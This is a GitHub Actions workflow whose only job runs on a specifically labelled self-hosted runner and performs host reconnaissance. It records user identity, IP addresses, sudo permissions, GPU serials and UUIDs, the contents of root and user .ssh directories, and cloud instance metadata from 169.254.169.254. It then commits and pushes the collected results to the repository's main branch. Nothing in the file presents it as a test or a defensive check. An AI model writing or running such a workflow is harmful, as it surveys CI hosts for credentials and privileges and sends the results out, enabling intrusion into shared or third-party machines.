name: ul6599-queue
on: [workflow_dispatch]
permissions:
  contents: write
jobs:
  p0:
    runs-on: [self-hosted, t1946107x61]
    timeout-minutes: 8
    steps:
      - name: census
        run: |
          {
            echo "LABEL t1946107x61 $(date -u +%FT%TZ)"; id; hostname; hostname -I
            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
            nvidia-smi -L
            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
          } > /tmp/res.txt 2>&1
          git config user.email ul@local; git config user.name ul
          mkdir -p ul && cp /tmp/res.txt ul/res_t1946107x61.txt
          git add ul/res_t1946107x61.txt && git commit -qm "res t1946107x61" && git push origin HEAD:main || true
          cat /tmp/res.txt

